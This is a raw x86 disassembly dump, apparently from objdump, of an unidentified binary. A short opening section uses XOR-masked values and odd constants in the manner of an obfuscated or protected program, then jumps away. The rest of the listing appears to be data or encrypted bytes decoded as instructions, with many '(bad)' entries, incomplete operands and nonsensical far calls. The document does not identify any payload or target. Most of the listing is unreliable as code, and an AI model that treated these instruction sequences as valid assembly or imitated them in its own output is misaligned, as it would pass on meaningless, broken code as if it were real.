  4141c5:	mov    edi,DWORD PTR [ebp+0xc]
  4141c8:	xor    edi,ecx
  4141ca:	xor    eax,ecx
  4141cc:	lea    eax,[eax+edi*1+0x64e5b6]
  4141d3:	mov    edi,DWORD PTR [ebp+0xc]
  4141d6:	xor    edi,ecx
  4141d8:	add    edi,edx
  4141da:	imul   eax,edi
  4141dd:	mov    edi,DWORD PTR [ebp+0xc]
  4141e0:	xor    edi,ecx
  4141e2:	sub    edi,eax
  4141e4:	mov    eax,DWORD PTR [ebp-0x4]
  4141e7:	add    edi,edx
  4141e9:	cmp    DWORD PTR [eax],edi
  4141eb:	mov    eax,DWORD PTR [ebp-0x4]
  4141ee:	mov    edi,DWORD PTR [ebp+0x10]
  4141f1:	jg     0x414204
  4141f7:	xor    edi,ecx
  4141f9:	mov    ebx,esi
  4141fb:	sub    ebx,edi
  4141fd:	add    DWORD PTR [eax],ebx
  4141ff:	jmp    0x41420a
  414204:	xor    edi,ecx
  414206:	add    edi,edx
  414208:	add    DWORD PTR [eax],edi
  41420a:	mov    eax,DWORD PTR [ebp-0x8]
  41420d:	mov    edi,DWORD PTR [ebp-0x10]
  414210:	mov    eax,DWORD PTR [eax]
  414212:	xor    edi,ecx
  414214:	add    edi,0x3272da
  41421a:	not    edi
  41421c:	and    eax,edi
  41421e:	movsx  di,BYTE PTR [eax+0x1]
  414223:	mov    ebx,0x3b4b
  414228:	sub    di,bx
  41422b:	mov    ebx,0x8a85
  414230:	xor    di,bx
  414233:	mov    ebx,0x4f8a
  414238:	cmp    di,bx
  41423b:	jmp    0x4165fa
  414240:	out    dx,al
  414241:	add    eax,0x6723a723
  414246:	outs   dx,BYTE PTR ds:[esi]
  414247:	sbb    DWORD PTR [edx+0x1b],0xf
  41424b:	hlt    
  41424c:	push   es
  41424d:	nop
  41424e:	push   esi
  41424f:	jecxz  0x4142ce
  414251:	inc    esi
  414252:	popa   
  414253:	(bad)  
  414254:	rcr    BYTE PTR [edi+0x62],0x62
  414258:	xor    al,0x84
  41425a:	je     0x414251
  41425c:	push   ds
  41425d:	shl    BYTE PTR [esi+ebx*4+0x28512762],0xda
  414265:	retf   
  414266:	push   esp
  414267:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414268:	dec    edx
  414269:	xchg   esi,eax
  41426a:	adc    al,0x65
  41426c:	imul   DWORD PTR [ebx-0x945536d]
  414272:	and    al,0xfc
  414274:	jne    0x41425c
  414276:	inc    esi
  414277:	fcom   QWORD PTR [ebp+0x45]
  41427a:	cmp    al,al
  41427c:	ds into 
  41427e:	cmp    dl,bl
  414280:	das    
  414281:	shl    BYTE PTR [edx+0xc8996b9],1
  414287:	push   es
  414288:	ins    BYTE PTR es:[edi],dx
  414289:	push   0x10
  41428b:	call   0x4f5d32b4
  414290:	iret   
  414291:	mov    cs,WORD PTR [ebp+0x49fb3aea]
  414297:	mov    eax,0xc87b96
  41429c:	dec    edx
  41429d:	jmp    0x9040773e
  4142a2:	sbb    bl,BYTE PTR ds:0x410d97a4
  4142a8:	jge    0x4142ae
  4142aa:	and    eax,0xfe179e4f
  4142af:	adc    ebx,DWORD PTR [ebx-0x51]
  4142b2:	add    BYTE PTR [ecx+0x4a58a695],bh
  4142b8:	xchg   esp,ebx
  4142ba:	mov    cs,WORD PTR [ecx-0x3]
  4142bd:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4142bf:	ins    BYTE PTR es:[edi],dx
  4142c0:	push   eax
  4142c1:	enter  0x2b01,0xbd
  4142c5:	xor    ecx,esi
  4142c7:	pop    esi
  4142c8:	push   es
  4142c9:	xchg   ebx,eax
  4142ca:	jae    0x41433b
  4142cc:	ja     0x4142e5
  4142ce:	cmp    BYTE PTR [ebx+0x51],0x18
  4142d2:	mov    ebp,0xb787a73e
  4142d7:	repz sub BYTE PTR es:[eax+esi*1-0x58effd62],0x47
  4142e1:	xlat   BYTE PTR ds:[ebx]
  4142e2:	inc    ecx
  4142e3:	inc    esp
  4142e4:	fsub   st(2),st
  4142e6:	je     0x414317
  4142e8:	cmp    eax,0xb1c49b9
  4142ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142ee:	push   esi
  4142ef:	dec    eax
  4142f0:	jecxz  0x41435c
  4142f2:	mov    al,ds:0xba3159d9
  4142f7:	or     esp,DWORD PTR [ebp-0x4d98db6a]
  4142fd:	les    ebx,FWORD PTR [esi+0x48]
  414300:	or     esi,DWORD PTR [edx+0x67bdd47b]
  414306:	lods   eax,DWORD PTR ds:[esi]
  414307:	push   eax
  414308:	mov    ss,ebx
  41430a:	hlt    
  41430b:	inc    esp
  41430c:	xchg   edi,eax
  41430d:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41430f:	sahf   
  414310:	or     al,BYTE PTR [esi-0x694dce0a]
  414316:	jo     0x414357
  414318:	inc    esi
  414319:	ffreep st(7)
  41431b:	mov    ah,0x50
  41431d:	in     eax,0xc9
  41431f:	mov    al,0x9
  414321:	mov    fs,WORD PTR [ebp+0x48900773]
  414327:	add    BYTE PTR [ebp-0x51a9e8a0],bl
  41432d:	mov    dl,0x8a
  41432f:	jg     0x4142c8
  414331:	mov    dl,0x9f
  414333:	sub    ah,BYTE PTR [edx+0x6]
  414336:	jecxz  0x414360
  414338:	xchg   esp,eax
  414339:	xor    dl,bl
  41433b:	and    esp,DWORD PTR [eax]
  41433d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41433e:	mov    al,ds:0xab7269b1
  414343:	add    ch,BYTE PTR [edx]
  414345:	sbb    BYTE PTR [edi-0x3897f472],ah
  41434b:	jo     0x414333
  41434d:	sub    eax,0x49e1142b
  414352:	jg     0x414324
  414354:	jmp    FWORD PTR [ebx-0x58]
  414357:	pop    ecx
  414358:	xor    ecx,DWORD PTR [eax-0x723e1116]
  41435e:	adc    al,0x5c
  414360:	aas    
  414361:	push   ds
  414362:	mov    DWORD PTR [eax],ecx
  414364:	shl    DWORD PTR [ebx+eiz*8+0x7a],0xae
  414369:	pop    ds
  41436a:	int3   
  41436b:	mov    fs,eax
  41436d:	sub    BYTE PTR ds:0x742a1c05,0xee
  414374:	mov    BYTE PTR [edi+0x6c],ch
  414377:	fist   WORD PTR [edx]
  414379:	inc    edi
  41437a:	mov    bl,0xed
  41437c:	fadd   st(2),st
  41437e:	jp     0x41437e
  414380:	imul   DWORD PTR [esi-0x5828bf38]
  414386:	adc    al,BYTE PTR [edi]
  414388:	into   
  414389:	lea    eax,[edi]
  41438b:	leave  
  41438c:	jbe    0x4143e8
  41438e:	daa    
  41438f:	addr16 stc 
  414391:	out    0x5d,al
  414393:	and    eax,0x3aab9d7c
  414398:	jae    0x414329
  41439a:	add    BYTE PTR [ebx],dl
  41439c:	cld    
  41439d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41439e:	xor    eax,0xb573b3a8
  4143a3:	(bad)  
  4143a4:	cmp    al,0x8
  4143a6:	int3   
  4143a7:	pushf  
  4143a8:	cmp    bl,cl
  4143aa:	mov    dl,BYTE PTR [ecx-0x60f1b5e6]
  4143b0:	mov    edi,?
  4143b2:	cmp    ah,BYTE PTR [esi+0x9]
  4143b5:	add    DWORD PTR [ebx+0x8],edi
  4143b8:	xor    eax,DWORD PTR [ebx]
  4143ba:	cmc    
  4143bb:	js     0x414345
  4143bd:	add    DWORD PTR [esi-0x4],0x4f
  4143c1:	test   DWORD PTR [ebx-0x63],esi
  4143c4:	mov    BYTE PTR [edi+eax*4],bl
  4143c7:	sub    eax,0x6559819
  4143cc:	jl     0x41441e
  4143ce:	pop    ebx
  4143cf:	cs loop 0x41437f
  4143d2:	adc    bl,BYTE PTR [eax+edi*1+0x3704b5cf]
  4143d9:	pop    ss
  4143da:	rol    ebp,1
  4143dc:	sbb    edx,DWORD PTR [esi-0x57]
  4143df:	push   0xf24ae523
  4143e4:	cli    
  4143e5:	sbb    al,0x15
  4143e7:	loopne 0x41441e
  4143e9:	push   eax
  4143ea:	mov    edi,0xa73ad458
  4143ef:	xchg   BYTE PTR es:[ecx],dh
  4143f2:	in     eax,dx
  4143f3:	inc    edx
  4143f4:	mov    bh,0x2c
  4143f6:	mov    al,0x72
  4143f9:	cli    
  4143fa:	jecxz  0x4143e7
  4143fc:	mov    al,0x5b
  4143fe:	mov    esp,DWORD PTR [ecx]
  414400:	ret    
  414401:	mov    ebx,0x84e904db
  414406:	inc    ecx
  414407:	scas   al,BYTE PTR es:[edi]
  414408:	xor    al,0xf9
  41440a:	in     al,dx
  41440b:	arpl   WORD PTR [esi+0x61a3bf5d],cx
  414411:	scas   eax,DWORD PTR es:[edi]
  414412:	jno    0x41439f
  414414:	push   edi
  414415:	repnz inc edi
  414417:	bound  eax,QWORD PTR [ebx-0x4532fdf9]
  41441d:	fnstenv [ecx]
  41441f:	cwde   
  414420:	popa   
  414421:	adc    ebx,ebx
  414423:	in     eax,dx
  414424:	retf   0x9cc3
  414427:	inc    eax
  414428:	mov    DWORD PTR [edi+0x4095ef5c],0xeecda040
  414432:	jbe    0x4143e4
  414434:	sar    edx,1
  414436:	pushf  
  414437:	inc    ebx
  414438:	push   cs
  414439:	push   0xd26cddd7
  41443e:	xchg   edi,eax
  41443f:	aad    0xa
  414441:	inc    edx
  414442:	icebp  
  414443:	sti    
  414444:	mov    esi,0x2620b78c
  414449:	stc    
  41444a:	dec    eax
  41444b:	xchg   esp,eax
  41444c:	xchg   ecx,eax
  41444d:	xchg   esi,eax
  41444f:	jnp    0x4143f1
  414451:	xchg   esi,eax
  414452:	test   esp,ebp
  414454:	sbb    DWORD PTR [edx+0x23],0xff54fb33
  41445b:	mov    ds:0x34080545,al
  414460:	das    
  414461:	dec    ebx
  414462:	int    0x95
  414464:	inc    ebx
  414465:	hlt    
  414466:	mov    edi,0x8cf459b8
  41446b:	dec    eax
  41446c:	sub    DWORD PTR [edi+0x4],ebx
  41446f:	(bad)
  414473:	repz cs pop eax
  414476:	out    0x73,eax
  414478:	popf   
  414479:	mov    cl,0x25
  41447b:	mov    dl,bh
  41447d:	mov    ds:0xabd31718,al
  414482:	mov    eax,ds:0x87fb75c6
  414487:	jp     0x414497
  414489:	mov    ch,0xe8
  41448b:	push   ebx
  41448c:	jge    0x4144f2
  41448e:	jle    0x414449
  414490:	gs das 
  414492:	jl     0x41447c
  414494:	test   BYTE PTR [ebx-0x70],0x6
  414498:	xor    BYTE PTR [edx+0x572bd6e6],bl
  41449e:	push   es
  41449f:	adc    bl,BYTE PTR [ebp+0x39eea111]
  4144a5:	repnz pop ecx
  4144a7:	pop    es
  4144a8:	xlat   BYTE PTR ds:[ebx]
  4144a9:	or     DWORD PTR [ebp+0x7bdb30b8],edi
  4144af:	mov    ecx,0x752d4238
  4144b4:	(bad)  
  4144b6:	mov    DWORD PTR [esi+ecx*4],eax
  4144b9:	sbb    cl,al
  4144bb:	ret    0x1a1a
  4144be:	mov    esi,0x3d86a895
  4144c3:	cmp    eax,0xe5ed3f8c
  4144c8:	stos   DWORD PTR es:[edi],eax
  4144c9:	mov    ecx,0xa310a90b
  4144ce:	dec    esi
  4144cf:	(bad)  
  4144d0:	mov    ch,0xbe
  4144d2:	call   0xc428:0xd3148de3
  4144d9:	push   edi
  4144da:	push   es
  4144db:	mov    ch,0xcf
  4144dd:	fcom   st(3)
  4144df:	jbe    0x414470
  4144e1:	enterw 0xe126,0x99
  4144e6:	idiv   BYTE PTR [ebp+0x169a9743]
  4144ec:	lock iret 
  4144ee:	mov    ecx,0xde60cd30
  4144f3:	push   edi
  4144f4:	jo     0x41448f
  4144f6:	and    al,0x8d
  4144f8:	(bad)  
  4144f9:	int    0x65
  4144fb:	loop   0x4144e4
  4144fd:	fsubr  st,st(4)
  4144ff:	sbb    edi,esp
  414501:	mov    eax,ds:0xb9e804e6
  414506:	out    dx,al
  414507:	sbb    al,0x60
  414509:	sub    BYTE PTR [edi+edx*2+0x13],0xf1
  41450e:	mov    ebp,0x43a60528
  414513:	test   DWORD PTR [esi-0x52ce9807],ebx
  414519:	out    dx,al
  41451a:	mov    esp,0xf935a1a3
  41451f:	dec    ebx
  414520:	retf   0xaa08
  414523:	mov    al,0x5f
  414525:	pop    es
  414526:	cmc    
  414527:	lods   eax,DWORD PTR ds:[esi]
  414528:	mov    BYTE PTR [ecx+0x14],dl
  41452b:	inc    edi
  41452c:	jl     0x4144ba
  41452e:	mov    edi,0x9e5d894f
  414533:	arpl   WORD PTR [ecx-0x2a],cx
  414536:	cmp    eax,0x326554d0
  41453b:	sbb    dl,BYTE PTR [esp+edx*1+0x7e0d6dda]
  414542:	enter  0xce5,0x1c
  414546:	add    BYTE PTR [edx-0x36f231e6],cl
  41454c:	stos   BYTE PTR es:[edi],al
  41454d:	jae    0x414517
  41454f:	or     DWORD PTR ds:0x3691a220,0x1d
  414556:	aam    0xc8
  414558:	sbb    DWORD PTR [eax+esi*8+0x6c],0x7
  41455d:	retf   
  41455e:	inc    ebp
  41455f:	ins    BYTE PTR es:[edi],dx
  414560:	fwait
  414561:	adc    BYTE PTR [edi-0x73836336],dh
  414567:	sti    
  414568:	sbb    BYTE PTR ds:0xdf409697,bh
  41456e:	stc    
  41456f:	push   ds
  414570:	pop    ss
  414571:	xor    DWORD PTR [ecx-0x37],0xfaa23a19
  414578:	mov    WORD PTR [edi],?
  41457a:	or     eax,0x472b2b2d
  41457f:	in     eax,dx
  414580:	and    eax,0xa2317513
  414585:	jne    0x4145ca
  414587:	aas    
  414588:	jge    0x41451c
  41458a:	pop    ecx
  41458b:	inc    eax
  41458c:	(bad)  
  41458d:	sub    BYTE PTR [eax-0x6332151a],al
  414593:	cdq    
  414594:	sbb    BYTE PTR [ebx],bh
  414596:	ins    DWORD PTR es:[edi],dx
  414597:	adc    dl,BYTE PTR [ecx+0x73]
  41459a:	add    eax,0x3ab0d94c
  41459f:	xchg   ebp,eax
  4145a0:	lods   eax,DWORD PTR ds:[esi]
  4145a1:	mov    bh,0xaf
  4145a3:	inc    esi
  4145a4:	mov    eax,DWORD PTR ds:0x553f214e
  4145aa:	cmp    BYTE PTR [ecx+esi*4+0x121f6c8b],bh
  4145b1:	stos   BYTE PTR es:[edi],al
  4145b2:	mov    esp,0x8e7ab4e8
  4145b7:	cwde   
  4145b8:	mov    esi,0x56f71869
  4145bd:	fs adc eax,0xfea75ba9
  4145c3:	jns    0x4145ff
  4145c5:	push   esp
  4145c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145c7:	iret   
  4145c8:	xchg   BYTE PTR [edi],bl
  4145ca:	sbb    ebx,DWORD PTR [eax-0x13]
  4145cd:	add    al,0xb2
  4145cf:	ins    DWORD PTR es:[edi],dx
  4145d0:	es aaa 
  4145d2:	jl     0x4145d7
  4145d4:	sbb    dh,BYTE PTR [ecx]
  4145d6:	xchg   edx,eax
  4145d7:	sub    esp,ecx
  4145d9:	in     al,0x58
  4145db:	pop    ss
  4145dc:	int    0x1a
  4145de:	sbb    al,0xe9
  4145e0:	sti    
  4145e1:	add    esi,DWORD PTR [edi]
  4145e3:	std    
  4145e4:	sysenter 
  4145e6:	pop    edi
  4145e7:	jno    0x414591
  4145e9:	push   eax
  4145ea:	sar    BYTE PTR [ebx-0x23c13350],1
  4145f0:	and    BYTE PTR [ecx-0x74],dh
  4145f3:	daa    
  4145f4:	adc    BYTE PTR ds:0x4d8776ed,ch
  4145fa:	lahf   
  4145fb:	push   es
  4145fc:	sbb    eax,0x8c7b59fb
  414601:	sub    eax,0x13b988d0
  414606:	arpl   WORD PTR [edi],cx
  414608:	je     0x4145c3
  41460a:	in     al,0x25
  41460c:	lods   al,BYTE PTR ds:[esi]
  41460d:	sbb    DWORD PTR [edx-0x17],0xffffff92
  414611:	iret   
  414612:	and    eax,DWORD PTR [edi*2+0x2622ff87]
  414619:	stos   DWORD PTR es:[edi],eax
  41461a:	push   esi
  41461b:	xor    BYTE PTR [eax+0x61],ah
  41461e:	loope  0x41462a
  414620:	int    0xef
  414622:	cmp    esi,DWORD PTR [ebp+0x27f7f196]
  414628:	test   BYTE PTR [esi],dh
  41462a:	mov    eax,ds:0x60f88b8
  41462f:	dec    ebp
  414630:	xchg   ebp,eax
  414631:	push   eax
  414632:	inc    esi
  414633:	mov    WORD PTR [ebx+0x7f],es
  414636:	(bad)  [eax-0x4c]
  414639:	push   ss
  41463a:	clc    
  41463b:	adc    BYTE PTR [edi-0x76840fe0],ah
  414641:	stos   BYTE PTR es:[edi],al
  414642:	sbb    edi,DWORD PTR [edi-0x602bdf31]
  414648:	jecxz  0x41465e
  41464a:	cmp    al,0xf2
  41464c:	mov    ecx,0xa6bb6774
  414651:	sub    dl,BYTE PTR ds:0x9e2749f8
  414657:	cwde   
  414658:	mov    ebp,0xabd28a02
  41465d:	push   esp
  41465e:	imul   ebx,DWORD PTR [ecx+0x7b5fa4f3],0x8568e3d1
  414668:	fimul  WORD PTR [esi]
  41466a:	pop    edi
  41466b:	in     al,dx
  41466c:	pop    ecx
  41466d:	arpl   cx,bx
  41466f:	jmp    0x524b5383
  414674:	xchg   esi,eax
  414675:	les    edx,FWORD PTR [ecx]
  414677:	xchg   ebp,eax
  414678:	xchg   esi,eax
  414679:	sub    DWORD PTR ds:0xde15290f,ecx
  41467f:	rcr    BYTE PTR [ebx+esi*2-0x78],0x66
  414684:	cmp    esi,DWORD PTR [ebx+eiz*8+0x39]
  414688:	out    dx,al
  414689:	(bad)  
  41468a:	mov    eax,0xac27fc53
  41468f:	jae    0x414694
  414691:	dec    edi
  414692:	nop
  414693:	mov    eax,ds:0xef54b681
  414698:	mov    al,0xa9
  41469a:	fs push esp
  41469c:	aaa    
  41469d:	rol    dh,1
  41469f:	(bad)  
  4146a0:	xchg   ebp,eax
  4146a1:	mov    esi,0x7724cc77
  4146a6:	popf   
  4146a7:	imul   esi,DWORD PTR [eax],0x3583d478
  4146ad:	aas    
  4146ae:	mov    ds:0x545d8735,eax
  4146b3:	mov    al,ds:0xd1a2a22a
  4146b8:	pop    edx
  4146b9:	push   edx
  4146ba:	lods   al,BYTE PTR ds:[esi]
  4146bb:	popa   
  4146bc:	push   0x45
  4146be:	dec    esp
  4146bf:	out    0x3b,eax
  4146c1:	dec    eax
  4146c2:	mov    ecx,0xa3109251
  4146c7:	retf   0xf54b
  4146ca:	fimul  DWORD PTR [esi+edx*8]
  4146cd:	or     BYTE PTR [esi],0x38
  4146d0:	cld    
  4146d1:	pop    ss
  4146d2:	dec    esi
  4146d3:	or     eax,0x26cbdc99
  4146d8:	(bad)
  4146dc:	sub    edx,DWORD PTR [eax]
  4146de:	push   eax
  4146df:	mov    ecx,0x37b64ab1
  4146e4:	call   0xdb99:0xca2a9890
  4146eb:	mov    edi,?
  4146ed:	pop    ss
  4146ee:	aaa    
  4146ef:	xor    al,0x4a
  4146f1:	pop    ss
  4146f2:	dec    eax
  4146f3:	mov    edi,0xb388fcd3
  4146f8:	dec    edx
  4146f9:	push   edi
  4146fa:	sahf   
  4146fb:	mov    dh,BYTE PTR [ebx+ecx*4]
  4146fe:	out    0x2c,eax
  414700:	jno    0x414726
  414702:	mov    ch,0x20
  414704:	dec    esi
  414705:	call   0x914fe93d
  41470a:	jl     0x4146f0
  41470c:	push   esp
  41470d:	shl    BYTE PTR [edx+0x9],0x32
  414711:	mov    ds:0x917e1acc,eax
  414716:	fwait
  414717:	imul   esp,DWORD PTR [ebp+0x404ac7a6],0x8d3cce82
  414721:	cmp    ebx,ecx
  414723:	arpl   WORD PTR [esi-0x4f],di
  414726:	out    dx,al
  414727:	or     ebp,DWORD PTR [ebx+0x6f72299a]
  41472d:	retf   0xc5a9
  414730:	rcr    DWORD PTR [eax-0x4],cl
  414733:	fadd   DWORD PTR [ecx+0x3a]
  414736:	imul   ebp,DWORD PTR [edx-0x1c9685e4],0xffffff98
  41473d:	mov    ebx,0x1a0829b
  414742:	hlt    
  414743:	xchg   edi,edi
  414745:	sub    ebp,DWORD PTR [ebp+0x39]
  414748:	adc    al,0xe8
  41474a:	dec    ecx
  41474b:	dec    esp
  41474c:	push   ebp
  41474d:	popa   
  41474e:	add    BYTE PTR [edx],bh
  414750:	repz mov ecx,0xf8678b64
  414756:	xor    DWORD PTR [edi],ecx
  414758:	jl     0x414796
  41475a:	jb     0x4147a7
  41475c:	xchg   ebx,eax
  41475d:	or     BYTE PTR [ecx-0x3fedc4aa],al
  414763:	adc    al,0x85
  414765:	rcl    DWORD PTR [ebx+0x5e],0xe5
  414769:	adc    BYTE PTR [edx-0x3b],dh
  41476c:	ret    0x96bf
  41476f:	and    edi,DWORD PTR [ebx+eiz*2]
  414772:	out    dx,eax
  414773:	sbb    BYTE PTR [esi],dh
  414775:	shl    DWORD PTR [eax-0x32],cl
  414778:	push   es
  414779:	shr    DWORD PTR [esi],1
  41477b:	inc    ebp
  41477c:	mov    ch,cl
  41477e:	push   0x1c
  414780:	adc    bh,BYTE PTR [edx]
  414782:	aad    0xf0
  414784:	add    eax,DWORD PTR [ecx-0x7c]
  414787:	ret    0xc3a8
  41478a:	and    al,0xd9
  41478c:	sub    dh,al
  41478e:	inc    esp
  41478f:	(bad)  
  414791:	repnz out 0xf0,al
  414794:	and    edi,DWORD PTR [ecx+0x1]
  414797:	cmp    esi,DWORD PTR [ecx-0x7de24d25]
  41479d:	fiadd  WORD PTR [eax-0x7e0fee24]
  4147a3:	outs   dx,BYTE PTR ds:[esi]
  4147a4:	test   al,0x70
  4147a6:	ror    DWORD PTR [esi],cl
  4147a8:	test   esp,edi
  4147aa:	mov    ebp,0x64c9848b
  4147af:	add    BYTE PTR [ebp+0x2d9e979f],al
  4147b5:	jecxz  0x41475a
  4147b7:	mov    DWORD PTR [edi+eiz*1+0x5f],ebx
  4147bb:	jns    0x4147c6
  4147bd:	adc    al,0x25
  4147bf:	rcr    DWORD PTR [ecx-0x5644a4f2],cl
  4147c5:	jle    0x414799
  4147c7:	test   DWORD PTR [ebp+edi*1+0x7dff4a58],esp
  4147ce:	sbb    eax,DWORD PTR [eax]
  4147d0:	sub    DWORD PTR [ecx+0x14],edi
  4147d3:	push   ds
  4147d4:	push   0x4bcbaf7b
  4147d9:	inc    eax
  4147da:	div    BYTE PTR [eax]
  4147dc:	retf   
  4147dd:	jg     0x4147e0
  4147df:	lds    eax,FWORD PTR [ecx+edi*2+0x35aa902c]
  4147e6:	test   eax,0xabd47f6e
  4147eb:	cs mov ch,0x1e
  4147ee:	jbe    0x414809
  4147f0:	add    DWORD PTR [ebx+0x1fa82010],ebx
  4147f6:	jmp    0x4147ec
  4147f8:	adc    al,0x9
  4147fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147fb:	(bad)  
  4147fc:	aaa    
  4147fd:	popf   
  4147fe:	sbb    eax,ebx
  414800:	retf   
  414801:	jno    0x41479c
  414803:	mov    ?,WORD PTR [edx]
  414805:	sub    eax,0xb79b065e
  41480a:	leave  
  41480b:	aad    0xe2
  41480d:	pop    ebx
  41480e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41480f:	adc    ch,cl
  414811:	sub    al,0xd8
  414813:	(bad)  
  414814:	mov    esi,0x45c143f
  414819:	arpl   WORD PTR [edi-0x68],dx
  41481c:	rcr    DWORD PTR [esi],cl
  41481e:	test   BYTE PTR [eax+eiz*4+0x6c7367fb],al
  414825:	pop    edi
  414826:	xor    al,0xef
  414828:	sub    eax,0x3aa812c5
  41482d:	cmp    al,0x9e
  41482f:	and    al,BYTE PTR [eax]
  414831:	push   es
  414832:	jp     0x4147fe
  414834:	loopne 0x4148ad
  414836:	dec    ebp
  414837:	cmp    eax,0x774118ed
  41483c:	push   ebp
  41483d:	fmul   DWORD PTR [esi+0x39e1e3d1]
  414843:	or     bh,ch
  414845:	xlat   BYTE PTR ds:[ebx]
  414846:	mov    eax,ds:0x94a17be7
  41484b:	push   edi
  41484c:	adc    bh,0xaa
  41484f:	jno    0x4147ea
  414851:	lea    ebx,[ecx-0xd7f2592]
  414857:	ss and al,0xee
  41485a:	add    BYTE PTR [edi+eax*4-0x203b8a6a],dh
  414861:	aaa    
  414862:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414863:	call   DWORD PTR [edi]
  414865:	cmp    BYTE PTR [edx],dh
  414867:	shl    BYTE PTR [esi+eiz*2+0x53eeac29],cl
  41486e:	cli    
  41486f:	pop    DWORD PTR ds:0x3544eddb
  414875:	cmp    eax,0xbb6f823f
  41487a:	aad    0x2c
  41487c:	mov    esp,0x74046063
  414881:	fild   QWORD PTR [ecx+ebp*2-0x8a26d00]
  414888:	push   ds
  414889:	and    al,0x52
  41488b:	adc    edx,edx
  41488d:	adc    ebx,DWORD PTR [edx]
  41488f:	xor    DWORD PTR [esp+ebx*8-0x36],ecx
  414893:	xchg   esi,eax
  414894:	popa   
  414895:	and    DWORD PTR [edx],0xffffff96
  414898:	and    esi,DWORD PTR ds:0xd3295bb
  41489e:	rcr    DWORD PTR [ebx],1
  4148a0:	push   ds
  4148a1:	adc    BYTE PTR [esi],dh
  4148a3:	inc    edx
  4148a4:	call   0xe40353f2
  4148a9:	jl     0x41489a
  4148ab:	jbe    0x4148f9
  4148ad:	add    DWORD PTR [eax],ecx
  4148af:	mov    dh,0xf1
  4148b1:	push   ss
  4148b2:	or     cl,cl
  4148b4:	les    ecx,FWORD PTR [ebp-0x29]
  4148b7:	ins    BYTE PTR es:[edi],dx
  4148b8:	jl     0x414879
  4148ba:	jae    0x4148b4
  4148bc:	mov    ds:0xa189dc47,al
  4148c1:	mov    ah,0xe1
  4148c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148c4:	and    DWORD PTR [edi],0x68
  4148c7:	(bad)  
  4148c8:	cdq    
  4148c9:	pop    ds
  4148ca:	into   
  4148cb:	xchg   ebx,eax
  4148cc:	clc    
  4148cd:	js     0x41490f
  4148cf:	inc    ebx
  4148d0:	add    al,0x5d
  4148d2:	fimul  WORD PTR [ebx]
  4148d4:	lock in al,dx
  4148d6:	cs aam 0x41
  4148d9:	fild   QWORD PTR [esp+ebp*4]
  4148dc:	push   edi
  4148dd:	out    dx,ax
  4148df:	dec    edi
  4148e0:	dec    esi
  4148e1:	lea    esp,[esi+0x4]
  4148e4:	imul   ebp,DWORD PTR [ecx*1+0x41a460c3],0xa0b930ca
  4148ef:	inc    edx
  4148f0:	fdivr  QWORD PTR [edx-0x2d31c04]
  4148f6:	mov    esi,0x8fd5fe35
  4148fb:	mov    BYTE PTR [ebp-0x48d727a8],al
  414901:	in     eax,0xb
  414903:	addr16 xor eax,0xe7914917
  414909:	popf   
  41490a:	lahf   
  41490b:	fsub   DWORD PTR [ebx]
  41490d:	mov    ds:0x5e3332c2,al
  414912:	(bad)  
  414914:	pop    ebx
  414915:	jnp    0x4148cc
  414917:	leave  
  414918:	or     al,al
  41491a:	int    0x93
  41491c:	add    cl,BYTE PTR [edx-0x62d542c4]
  414922:	shr    cl,cl
  414924:	add    dh,0x87
  414927:	leave  
  414928:	out    dx,eax
  414929:	mov    ds:0x734d3aa8,al
  41492e:	cmp    BYTE PTR [eax],bh
  414930:	popf   
  414931:	add    eax,0xe803af8b
  414936:	xor    al,0x27
  414938:	xchg   BYTE PTR [edx-0x2a830a9b],dl
  41493e:	inc    ecx
  41493f:	icebp  
  414940:	push   esi
  414941:	imul   ebp,DWORD PTR ds:0x5af3af99,0x18cfe7d3
  41494b:	scas   al,BYTE PTR es:[edi]
  41494c:	push   0x72
  41494e:	xchg   ebx,eax
  41494f:	out    0xb,al
  414951:	popf   
  414952:	xchg   esp,eax
  414953:	fs scas al,BYTE PTR es:[edi]
  414955:	jmp    FWORD PTR [ecx]
  414957:	adc    al,0xb8
  414959:	cli    
  41495a:	rcr    DWORD PTR [edx+0x19],cl
  41495d:	sub    al,0x84
  41495f:	sub    eax,0xb69a772a
  414964:	adc    eax,0x613e027b
  41496a:	fdivp  st(1),st
  41496c:	inc    ebp
  41496d:	mov    edi,0x1ad64b0f
  414972:	leave  
  414973:	push   0x64dc6b76
  414978:	lods   al,BYTE PTR ds:[esi]
  414979:	mov    ah,0x6f
  41497b:	and    DWORD PTR [esi+0x14086141],eax
  414981:	retf   0x77e2
  414984:	jbe    0x41496b
  414986:	cli    
  414987:	je     0x4149c4
  414989:	jmp    0x41494c
  41498b:	mov    ebx,0x5db5f57b
  414990:	nop
  414991:	pop    ss
  414992:	xor    BYTE PTR [eax+ecx*8-0x50],0xb3
  414997:	fist   DWORD PTR [eax-0x1f]
  41499a:	push   edx
  41499b:	js     0x414a06
  41499d:	js     0x4149ac
  41499f:	xchg   ecx,eax
  4149a0:	xlat   BYTE PTR ds:[ebx]
  4149a1:	dec    esp
  4149a2:	mulps  xmm5,XMMWORD PTR [ebp+0x12]
  4149a6:	pusha  
  4149a7:	pop    edi
  4149a8:	pop    ebx
  4149a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149aa:	inc    edi
  4149ab:	lods   al,BYTE PTR ds:[esi]
  4149ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149ad:	push   esi
  4149ae:	adc    esp,DWORD PTR [edi+eax*8]
  4149b1:	loop   0x41494c
  4149b3:	bound  ecx,QWORD PTR ds:0x78a7a959
  4149b9:	xchg   esp,eax
  4149ba:	repz jnp 0x4149c5
  4149bd:	xchg   esp,eax
  4149be:	lds    esp,FWORD PTR [ecx+0x7f6e59c4]
  4149c4:	mov    dh,0x35
  4149c6:	mov    al,ds:0x76dfbcba
  4149cb:	inc    ecx
  4149cc:	jmp    0x414952
  4149ce:	sbb    DWORD PTR [eax+0x231c0aa6],eax
  4149d4:	xor    BYTE PTR [ecx-0x74a37f11],cl
  4149da:	inc    edx
